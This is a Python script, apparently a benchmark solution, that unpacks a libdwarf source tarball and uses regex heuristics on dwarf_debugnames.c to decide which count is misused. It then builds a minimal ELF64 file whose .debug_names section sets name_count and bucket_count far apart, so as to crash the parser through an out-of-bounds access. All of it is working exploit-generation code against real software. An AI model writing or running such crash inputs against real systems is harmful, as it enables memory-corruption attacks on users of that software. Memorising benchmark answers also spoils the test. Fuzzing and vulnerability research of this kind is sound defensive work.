import os
import re
import tarfile
import tempfile
import struct
from typing import Dict, List, Optional, Tuple


def _align(off: int, a: int) -> int:
    if a <= 1:
        return off
    r = off % a
    return off if r == 0 else off + (a - r)


def _u16(x: int) -> bytes:
    return struct.pack("<H", x & 0xFFFF)


def _u32(x: int) -> bytes:
    return struct.pack("<I", x & 0xFFFFFFFF)


def _u64(x: int) -> bytes:
    return struct.pack("<Q", x & 0xFFFFFFFFFFFFFFFF)


def _uleb128(v: int) -> bytes:
    if v < 0:
        v = 0
    out = bytearray()
    while True:
        b = v & 0x7F
        v >>= 7
        if v:
            out.append(b | 0x80)
        else:
            out.append(b)
            break
    return bytes(out)


def _strip_c_comments(text: str) -> str:
    text = re.sub(r"/\*.*?\*/", "", text, flags=re.S)
    text = re.sub(r"//[^\n]*", "", text)
    return text


def _extract_tarball(src_path: str) -> str:
    if os.path.isdir(src_path):
        return os.path.abspath(src_path)
    tmp = tempfile.mkdtemp(prefix="src_")
    with tarfile.open(src_path, "r:*") as tf:
        tf.extractall(tmp)
    entries = [os.path.join(tmp, e) for e in os.listdir(tmp)]
    dirs = [p for p in entries if os.path.isdir(p)]
    if len(dirs) == 1:
        return dirs[0]
    return tmp


def _find_file(root: str, basename: str) -> Optional[str]:
    for dp, dn, fn in os.walk(root):
        if basename in fn:
            return os.path.join(dp, basename)
    return None


def _iter_text_files(root: str, max_bytes: int = 2_000_000):
    for dp, dn, fn in os.walk(root):
        for f in fn:
            if not f.lower().endswith((".c", ".cc", ".cpp", ".h", ".hpp", ".inc", ".txt", ".md")):
                continue
            p = os.path.join(dp, f)
            try:
                st = os.stat(p)
            except OSError:
                continue
            if st.st_size <= 0 or st.st_size > max_bytes:
                continue
            yield p


def _detect_input_type(root: str) -> str:
    # Best effort: look for an oss-fuzz harness mentioning debug_names.
    # If unclear, default to "elf".
    for p in _iter_text_files(root):
        try:
            data = open(p, "rb").read()
        except OSError:
            continue
        if b"LLVMFuzzerTestOneInput" not in data:
            continue
        if b"debug_names" not in data and b"debugnames" not in data:
            continue
        s = data.decode("utf-8", "ignore")
        if re.search(r"\bdwarf_(init|init_b|init_path|object_init|object_init_b)\b", s):
            return "elf"
        if re.search(r"\bdebug_names\b", s) and re.search(r"(Data|data|size_t|len)", s):
            # could still be ELF, but raw is possible
            if re.search(r"\bELF\b", s) or re.search(r"\.debug_names", s):
                return "elf"
            return "raw"
    return "elf"


def _detect_direction_from_source(root: str) -> str:
    # Try to infer which count is misused in allocations/loops.
    # Return:
    #   "name_gt_bucket" -> set name_count >> bucket_count
    #   "bucket_gt_name" -> set bucket_count >> name_count
    # Default to "name_gt_bucket" as most plausible.
    p = _find_file(root, "dwarf_debugnames.c")
    if not p:
        # fallback: search by path hint
        for cand in ("dwarf_debugnames.c", "dwarf_debugnames.c.in"):
            p = _find_file(root, cand)
            if p:
                break
    if not p:
        return "name_gt_bucket"

    try:
        txt = open(p, "r", encoding="utf-8", errors="ignore").read()
    except OSError:
        return "name_gt_bucket"
    txt = _strip_c_comments(txt)

    name_pat = r"(?:name_count|namecount|dn_name_count|dn_namecount|dnh_name_count|dnh_namecount)"
    bucket_pat = r"(?:bucket_count|bucketcount|dn_bucket_count|dn_bucketcount|dnh_bucket_count|dnh_bucketcount)"

    # Evidence counters
    ev_bucket_alloc_uses_name = 0
    ev_name_alloc_uses_bucket = 0

    lines = txt.splitlines()
    for line in lines:
        l = line.strip()
        if not l:
            continue
        if "malloc" not in l and "calloc" not in l and "alloc" not in l:
            continue
        # Focus on likely array allocations
        if re.search(r"\bbucket", l, re.I):
            if re.search(name_pat, l) and not re.search(bucket_pat, l):
                ev_bucket_alloc_uses_name += 2
            elif re.search(name_pat, l) and re.search(bucket_pat, l):
                # ambiguous, low weight
                ev_bucket_alloc_uses_name += 0
        if re.search(r"\b(hash|hashes|string_offsets|entry_offsets)\b", l, re.I):
            if re.search(bucket_pat, l) and not re.search(name_pat, l):
                ev_name_alloc_uses_bucket += 2

    # Also look for loops writing arrays: if loops use name_count but nearby alloc uses bucket_count.
    # Very rough: count any "for(...< name_count)" occurrences in file; if many, name_gt_bucket is likely.
    for_name_loops = len(re.findall(r"for\s*\([^;]*;[^;]*<[^;]*" + name_pat, txt))
    for_bucket_loops = len(re.findall(r"for\s*\([^;]*;[^;]*<[^;]*" + bucket_pat, txt))
    if for_name_loops >= for_bucket_loops:
        ev_name_alloc_uses_bucket += 1

    if ev_bucket_alloc_uses_name > ev_name_alloc_uses_bucket + 1:
        return "bucket_gt_name"
    return "name_gt_bucket"


def _build_debug_str(name_count: int) -> Tuple[bytes, List[int]]:
    # Standard .debug_str; keep it simple.
    # Put an initial NUL to make offset 0 a valid empty string.
    buf = bytearray(b"\x00")
    offs: List[int] = []
    for i in range(name_count):
        offs.append(len(buf))
        s = ("n%u" % i).encode("ascii", "ignore") + b"\x00"
        buf += s
    return bytes(buf), offs


def _build_debug_names_section(bucket_count: int, name_count: int, str_offsets: List[int]) -> bytes:
    # Build a single .debug_names name index.
    # Use a minimal abbreviation table: one abbrev with 2 attributes (compile_unit, die_offset) using DW_FORM_udata.
    # DW_IDX_compile_unit=1, DW_IDX_die_offset=3, DW_FORM_udata=0x0f, DW_TAG_compile_unit=0x11.
    abbrev = bytearray()
    abbrev += _uleb128(1)          # abbrev code
    abbrev += _uleb128(0x11)       # DW_TAG_compile_unit
    abbrev += _uleb128(2)          # attr_count
    abbrev += _uleb128(1) + _uleb128(0x0F)  # DW_IDX_compile_unit, DW_FORM_udata
    abbrev += _uleb128(3) + _uleb128(0x0F)  # DW_IDX_die_offset, DW_FORM_udata
    abbrev += _uleb128(0)          # end abbrev list (common convention)

    entry_pool = bytearray()
    entry_offsets: List[int] = []
    for _ in range(name_count):
        entry_offsets.append(len(entry_pool))
        entry_pool += b"\x01\x00\x00"  # abbrev_code=1, compile_unit=0, die_offset=0 (all uleb)

    # Buckets: put everything into bucket 0.
    buckets = [0] * bucket_count
    if bucket_count > 0 and name_count > 0:
        buckets[0] = 1  # 1-based index into the names table
    buckets_b = b"".join(_u32(v) for v in buckets)

    # Hashes: increasing values
    hashes_b = b"".join(_u32((i + 1) & 0xFFFFFFFF) for i in range(name_count))

    # String offsets: offsets into .debug_str
    string_offsets_b = b"".join(_u32(str_offsets[i] if i < len(str_offsets) else 0) for i in range(name_count))

    # Entry offsets: offsets into entry pool
    entry_offsets_b = b"".join(_u32(v & 0xFFFFFFFF) for v in entry_offsets)

    header = bytearray()
    header += _u16(5)              # version
    header += _u16(0)              # padding
    header += _u32(0)              # comp_unit_count
    header += _u32(0)              # local_type_unit_count
    header += _u32(0)              # foreign_type_unit_count
    header += _u32(bucket_count)   # bucket_count
    header += _u32(name_count)     # name_count
    header += _u32(len(abbrev))    # abbrev_table_size
    header += b"\x00"              # augmentation string (empty)

    body = header + buckets_b + hashes_b + string_offsets_b + entry_offsets_b + bytes(abbrev) + bytes(entry_pool)
    unit_length = len(body)
    return _u32(unit_length) + bytes(body)


def _build_elf(debug_names: bytes, debug_str: bytes) -> bytes:
    # Minimal ELF64 relocatable with sections:
    # 0: null, 1: .shstrtab, 2: .debug_names, 3: .debug_str
    shstr = b"\x00.shstrtab\x00.debug_names\x00.debug_str\x00"
    off_shstrtab_name = shstr.find(b".shstrtab")
    off_debug_names_name = shstr.find(b".debug_names")
    off_debug_str_name = shstr.find(b".debug_str")

    # Layout
    buf = bytearray(b"\x00" * 64)  # ELF header placeholder
    off = len(buf)

    # .debug_names
    off = _align(off, 0x10)
    dn_off = off
    buf += b"\x00" * (dn_off - len(buf))
    buf += debug_names
    dn_size = len(debug_names)
    off = len(buf)

    # .debug_str
    off = _align(off, 0x10)
    ds_off = off
    buf += b"\x00" * (ds_off - len(buf))
    buf += debug_str
    ds_size = len(debug_str)
    off = len(buf)

    # .shstrtab
    off = _align(off, 0x10)
    shstr_off = off
    buf += b"\x00" * (shstr_off - len(buf))
    buf += shstr
    shstr_size = len(shstr)
    off = len(buf)

    # Section headers
    off = _align(off, 0x10)
    shoff = off
    shnum = 4
    shentsize = 64
    buf += b"\x00" * (shoff - len(buf))
    buf += b"\x00" * (shnum * shentsize)

    def pack_sh(i: int, sh_name: int, sh_type: int, sh_flags: int, sh_addr: int, sh_offset: int, sh_size: int,
                sh_link: int, sh_info: int, sh_addralign: int, sh_entsize2: int) -> None:
        struct.pack_into(
            "<IIQQQQIIQQ",
            buf,
            shoff + i * shentsize,
            sh_name,
            sh_type,
            sh_flags,
            sh_addr,
            sh_offset,
            sh_size,
            sh_link,
            sh_info,
            sh_addralign,
            sh_entsize2
        )

    # Null section
    pack_sh(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
    # .shstrtab
    pack_sh(1, off_shstrtab_name, 3, 0, 0, shstr_off, shstr_size, 0, 0, 1, 0)
    # .debug_names
    pack_sh(2, off_debug_names_name, 1, 0, 0, dn_off, dn_size, 0, 0, 1, 0)
    # .debug_str
    pack_sh(3, off_debug_str_name, 1, 0, 0, ds_off, ds_size, 0, 0, 1, 0)

    # ELF header
    e_ident = bytearray(16)
    e_ident[0:4] = b"\x7fELF"
    e_ident[4] = 2  # ELFCLASS64
    e_ident[5] = 1  # ELFDATA2LSB
    e_ident[6] = 1  # EV_CURRENT
    e_ident[7] = 0  # System V
    # rest are 0

    e_type = 1       # ET_REL
    e_machine = 0x3E # EM_X86_64
    e_version = 1
    e_entry = 0
    e_phoff = 0
    e_flags = 0
    e_ehsize = 64
    e_phentsize = 0
    e_phnum = 0
    e_shentsize = shentsize
    e_shnum = shnum
    e_shstrndx = 1

    hdr = struct.pack(
        "<16sHHIQQQIHHHHHH",
        bytes(e_ident),
        e_type,
        e_machine,
        e_version,
        e_entry,
        e_phoff,
        shoff,
        e_flags,
        e_ehsize,
        e_phentsize,
        e_phnum,
        e_shentsize,
        e_shnum,
        e_shstrndx
    )
    buf[0:64] = hdr
    return bytes(buf)


class Solution:
    def solve(self, src_path: str) -> bytes:
        root = _extract_tarball(src_path)
        input_type = _detect_input_type(root)
        direction = _detect_direction_from_source(root)

        if direction == "bucket_gt_name":
            bucket_count = 64
            name_count = 2
        else:
            bucket_count = 2
            name_count = 64

        debug_str, str_offs = _build_debug_str(name_count)
        debug_names = _build_debug_names_section(bucket_count, name_count, str_offs)

        if input_type == "raw":
            return debug_names
        return _build_elf(debug_names, debug_str)